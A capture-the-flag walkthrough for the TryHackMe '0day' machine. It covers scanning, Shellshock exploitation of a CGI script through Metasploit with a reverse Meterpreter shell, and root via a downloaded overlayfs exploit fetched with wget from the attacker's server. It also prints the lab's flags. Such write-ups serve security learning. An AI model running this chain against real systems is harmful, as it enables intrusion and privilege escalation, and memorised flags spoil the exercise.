---
description: >-
  A complete walkthrough for the TryHackMe machine "0day". This report covers
  the full chain of exploitation from initial reconnaissance to gaining root
  access.
---

# 0day

## Reconnaissance

Lets start with the Rustscan&#x20;

```bash
rustscan -a 10.10.26.212 -b 500 -t 500 -- -A -sC -sV
```

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg

80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Pretty much standard stuff let's start with visiting the website on port 80 , but nothing interesting here

## Enumeration

lets start with finding hidden directories will use dirsearch for that&#x20;

```bash
dirsearch -u 10.10.26.212 -r
```

```bash
301   308B   http://10.10.26.212/js    -> REDIRECTS TO: http://10.10.26.212/js/
403   290B   http://10.10.26.212/.ht_wsr.txt
403   293B   http://10.10.26.212/.htaccess.bak1
403   293B   http://10.10.26.212/.htaccess.save
403   291B   http://10.10.26.212/.htaccess_sc
403   295B   http://10.10.26.212/.htaccess.sample
403   294B   http://10.10.26.212/.htaccess_extra
403   293B   http://10.10.26.212/.htaccess_orig
403   291B   http://10.10.26.212/.htaccessBAK
403   293B   http://10.10.26.212/.htaccess.orig
403   291B   http://10.10.26.212/.htaccessOLD
403   292B   http://10.10.26.212/.htaccessOLD2
403   283B   http://10.10.26.212/.htm
403   284B   http://10.10.26.212/.html
403   293B   http://10.10.26.212/.htpasswd_test
403   289B   http://10.10.26.212/.htpasswds
403   290B   http://10.10.26.212/.httr-oauth
301   311B   http://10.10.26.212/admin    -> REDIRECTS TO: http://10.10.26.212/admin/
200     0B   http://10.10.26.212/admin/
200     0B   http://10.10.26.212/admin/index.html
301   312B   http://10.10.26.212/backup    -> REDIRECTS TO: http://10.10.26.212/backup/
200     1KB  http://10.10.26.212/backup/
301   313B   http://10.10.26.212/cgi-bin    -> REDIRECTS TO: http://10.10.26.212/cgi-bin/
403   287B   http://10.10.26.212/cgi-bin/
200    13B   http://10.10.26.212/cgi-bin/test.cgi
301   309B   http://10.10.26.212/css    -> REDIRECTS TO: http://10.10.26.212/css/
301   309B   http://10.10.26.212/img    -> REDIRECTS TO: http://10.10.26.212/img/
200   453B   http://10.10.26.212/js/
200    38B   http://10.10.26.212/robots.txt
301   312B   http://10.10.26.212/secret    -> REDIRECTS TO: http://10.10.26.212/secret/
200    97B   http://10.10.26.212/secret/
403   292B   http://10.10.26.212/server-status
403   293B   http://10.10.26.212/server-status/
301   313B   http://10.10.26.212/uploads    -> REDIRECTS TO: http://10.10.26.212/uploads/
200     0B   http://10.10.26.212/uploads/
403   293B   http://10.10.26.212/js/.ht_wsr.txt
403   296B   http://10.10.26.212/js/.htaccess.orig
403   296B   http://10.10.26.212/js/.htaccess.bak1
403   296B   http://10.10.26.212/js/.htaccess_orig
403   297B   http://10.10.26.212/js/.htaccess_extra
403   296B   http://10.10.26.212/js/.htaccess.save
403   286B   http://10.10.26.212/js/.htm
403   294B   http://10.10.26.212/js/.htaccessBAK
403   295B   http://10.10.26.212/js/.htaccessOLD2
403   298B   http://10.10.26.212/js/.htaccess.sample
403   287B   http://10.10.26.212/js/.html
403   294B   http://10.10.26.212/js/.htaccess_sc
403   294B   http://10.10.26.212/js/.htaccessOLD
403   296B   http://10.10.26.212/js/.htpasswd_test
403   292B   http://10.10.26.212/js/.htpasswds
403   293B   http://10.10.26.212/js/.httr-oauth
200   131B   http://10.10.26.212/js/main.js
403   296B   http://10.10.26.212/admin/.ht_wsr.txt
403   299B   http://10.10.26.212/admin/.htaccess.bak1
403   299B   http://10.10.26.212/admin/.htaccess.orig
403   301B   http://10.10.26.212/admin/.htaccess.sample
403   299B   http://10.10.26.212/admin/.htaccess.save
403   300B   http://10.10.26.212/admin/.htaccess_extra
403   299B   http://10.10.26.212/admin/.htaccess_orig
403   297B   http://10.10.26.212/admin/.htaccess_sc
403   297B   http://10.10.26.212/admin/.htaccessOLD
403   297B   http://10.10.26.212/admin/.htaccessBAK
403   298B   http://10.10.26.212/admin/.htaccessOLD2
403   289B   http://10.10.26.212/admin/.htm
403   290B   http://10.10.26.212/admin/.html
403   299B   http://10.10.26.212/admin/.htpasswd_test
403   295B   http://10.10.26.212/admin/.htpasswds
403   296B   http://10.10.26.212/admin/.httr-oauth
403   297B   http://10.10.26.212/backup/.ht_wsr.txt
403   300B   http://10.10.26.212/backup/.htaccess.bak1
403   300B   http://10.10.26.212/backup/.htaccess.orig
403   302B   http://10.10.26.212/backup/.htaccess.sample
403   300B   http://10.10.26.212/backup/.htaccess.save
403   301B   http://10.10.26.212/backup/.htaccess_extra
403   300B   http://10.10.26.212/backup/.htaccess_orig
403   298B   http://10.10.26.212/backup/.htaccess_sc
403   298B   http://10.10.26.212/backup/.htaccessOLD
403   298B   http://10.10.26.212/backup/.htaccessBAK
403   299B   http://10.10.26.212/backup/.htaccessOLD2
403   291B   http://10.10.26.212/backup/.html
403   290B   http://10.10.26.212/backup/.htm
403   300B   http://10.10.26.212/backup/.htpasswd_test
403   296B   http://10.10.26.212/backup/.htpasswds
403   297B   http://10.10.26.212/backup/.httr-oauth
403   298B   http://10.10.26.212/cgi-bin/.ht_wsr.txt
403   301B   http://10.10.26.212/cgi-bin/.htaccess.bak1
403   301B   http://10.10.26.212/cgi-bin/.htaccess.orig
403   303B   http://10.10.26.212/cgi-bin/.htaccess.sample
403   301B   http://10.10.26.212/cgi-bin/.htaccess.save
403   299B   http://10.10.26.212/cgi-bin/.htaccess_sc
403   302B   http://10.10.26.212/cgi-bin/.htaccess_extra
403   301B   http://10.10.26.212/cgi-bin/.htaccess_orig
403   299B   http://10.10.26.212/cgi-bin/.htaccessBAK
403   299B   http://10.10.26.212/cgi-bin/.htaccessOLD
403   300B   http://10.10.26.212/cgi-bin/.htaccessOLD2
403   292B   http://10.10.26.212/cgi-bin/.html
403   291B   http://10.10.26.212/cgi-bin/.htm
403   297B   http://10.10.26.212/cgi-bin/.htpasswds
403   301B   http://10.10.26.212/cgi-bin/.htpasswd_test
403   298B   http://10.10.26.212/cgi-bin/.httr-oauth
403   294B   http://10.10.26.212/css/.ht_wsr.txt
403   297B   http://10.10.26.212/css/.htaccess.orig
403   297B   http://10.10.26.212/css/.htaccess.bak1
403   299B   http://10.10.26.212/css/.htaccess.sample
403   297B   http://10.10.26.212/css/.htaccess.save
403   298B   http://10.10.26.212/css/.htaccess_extra
403   297B   http://10.10.26.212/css/.htaccess_orig
403   295B   http://10.10.26.212/css/.htaccessBAK
403   295B   http://10.10.26.212/css/.htaccess_sc
403   295B   http://10.10.26.212/css/.htaccessOLD
403   296B   http://10.10.26.212/css/.htaccessOLD2
403   288B   http://10.10.26.212/css/.html
403   287B   http://10.10.26.212/css/.htm
403   297B   http://10.10.26.212/css/.htpasswd_test
403   293B   http://10.10.26.212/css/.htpasswds
403   294B   http://10.10.26.212/css/.httr-oauth
403   294B   http://10.10.26.212/img/.ht_wsr.txt
403   297B   http://10.10.26.212/img/.htaccess.bak1
403   297B   http://10.10.26.212/img/.htaccess.orig
403   299B   http://10.10.26.212/img/.htaccess.sample
403   297B   http://10.10.26.212/img/.htaccess.save
403   298B   http://10.10.26.212/img/.htaccess_extra
403   297B   http://10.10.26.212/img/.htaccess_orig
403   295B   http://10.10.26.212/img/.htaccess_sc
403   295B   http://10.10.26.212/img/.htaccessBAK
403   295B   http://10.10.26.212/img/.htaccessOLD
403   296B   http://10.10.26.212/img/.htaccessOLD2
403   287B   http://10.10.26.212/img/.htm
403   288B   http://10.10.26.212/img/.html
403   297B   http://10.10.26.212/img/.htpasswd_test
403   293B   http://10.10.26.212/img/.htpasswds
403   294B   http://10.10.26.212/img/.httr-oauth
403   297B   http://10.10.26.212/secret/.ht_wsr.txt
403   300B   http://10.10.26.212/secret/.htaccess.bak1
403   300B   http://10.10.26.212/secret/.htaccess.orig
403   300B   http://10.10.26.212/secret/.htaccess.save
403   302B   http://10.10.26.212/secret/.htaccess.sample
403   301B   http://10.10.26.212/secret/.htaccess_extra
403   300B   http://10.10.26.212/secret/.htaccess_orig
403   298B   http://10.10.26.212/secret/.htaccessBAK
403   298B   http://10.10.26.212/secret/.htaccess_sc
403   299B   http://10.10.26.212/secret/.htaccessOLD2
403   298B   http://10.10.26.212/secret/.htaccessOLD
403   290B   http://10.10.26.212/secret/.htm
403   291B   http://10.10.26.212/secret/.html
403   300B   http://10.10.26.212/secret/.htpasswd_test
403   296B   http://10.10.26.212/secret/.htpasswds
403   297B   http://10.10.26.212/secret/.httr-oauth
404   285B   http://10.10.26.212/server-status/%2e%2e//google.com
403   298B   http://10.10.26.212/uploads/.ht_wsr.txt
403   301B   http://10.10.26.212/uploads/.htaccess.bak1
403   301B   http://10.10.26.212/uploads/.htaccess.orig
403   303B   http://10.10.26.212/uploads/.htaccess.sample
403   301B   http://10.10.26.212/uploads/.htaccess.save
403   302B   http://10.10.26.212/uploads/.htaccess_extra
403   299B   http://10.10.26.212/uploads/.htaccess_sc
403   301B   http://10.10.26.212/uploads/.htaccess_orig
403   299B   http://10.10.26.212/uploads/.htaccessBAK
403   300B   http://10.10.26.212/uploads/.htaccessOLD2
403   299B   http://10.10.26.212/uploads/.htaccessOLD
403   292B   http://10.10.26.212/uploads/.html
403   291B   http://10.10.26.212/uploads/.htm
403   301B   http://10.10.26.212/uploads/.htpasswd_test
403   297B   http://10.10.26.212/uploads/.htpasswds
403   298B   http://10.10.26.212/uploads/.httr-oauth
```

so I tried all of them all where just "RABBIT HOLES"

but we one result is very interesting `/cgi-bin/test.cgi`

so seeing that I tried nikto scanner&#x20;

```bash
nikto -h 10.10.26.212
```

<pre class="language-bash"><code class="lang-bash">- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.126.27
+ Target Hostname:    10.10.126.27
+ Target Port:        80
+ Start Time:         2025-10-21 09:42:18 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test.cgi: <a data-footnote-ref href="#user-content-fn-1">Site appears vulnerable to the 'shellshock' vulnerability.</a> See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/index.html: Admin login page/section found.
+ 8885 requests: 4 error(s) and 17 item(s) reported on remote host
+ End Time:           2025-10-21 10:22:30 (GMT5.5) (2412 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

</code></pre>

so lets start with researching about "ShellShock" Vulnerability ( cve-2014-6271 )

find out that this vulnerability is how the `bash` handles the `env` variables and their values

Reference : [https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?ref=benheater.com](https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-\[paper].pdf?ref=benheater.com)

also found this exploit on exploit db and seems like their is a module available on metasploit

{% embed url="https://www.exploit-db.com/exploits/34895" %}

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

## Exploitation

After setting up everything in the module we will run the check if the target is vulnerable&#x20;

```bash
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 10.10.126.27:80 - The target is vulnerable.
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 10.11.152.146:1337 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.10.126.27
[*] Meterpreter session 1 opened (10.11.152.146:1337 -> 10.10.126.27:55904) at 2025-10-21 10:25:39 +0530

meterpreter > ls
Listing: /usr/lib/cgi-bin
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  73    fil   2020-09-02 22:47:29 +0530  test.cgi
```

We got the Shell now lets cat out the first user.txt flag&#x20;

```bash
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{Sh3llSh0ck_r0ckz}
```

## Privilege Escalation

Let's Escalate our privileges for that first we will run `linpeas.sh`

Red text with orange highlighted and linpeas says this is "Potentially 95% PE vector"

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

so lets start our search with the version number with exploit keyword&#x20;

found this :&#x20;

{% embed url="https://www.exploit-db.com/exploits/37292" %}

Sent this exploit using the python server to the remote machine

compiled it , ran it and got the ROOT shell

```bash
www-data@ubuntu:/tmp$ wget http://10.11.152.146:8000/ofs.c
wget http://10.11.152.146:8000/ofs.c
--2025-10-20 23:33:26--  http://10.11.152.146:8000/ofs.c
Connecting to 10.11.152.146:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4981 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,981       --.-K/s   in 0.001s  

2025-10-20 23:33:26 (7.24 MB/s) - 'ofs.c' saved [4981/4981]

www-data@ubuntu:/tmp$ gcc ofs.c -o ofs
gcc ofs.c -o ofs
www-data@ubuntu:/tmp$ ./ofs 
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Lets cat out that final root flag `root.txt`

```bash
# cat root.txt
cat root.txt
THM{g00d_j0b_0day_is_Pleased}
```

Thankyou for reading ☺️.

[^1]: Hmm.. very interesting
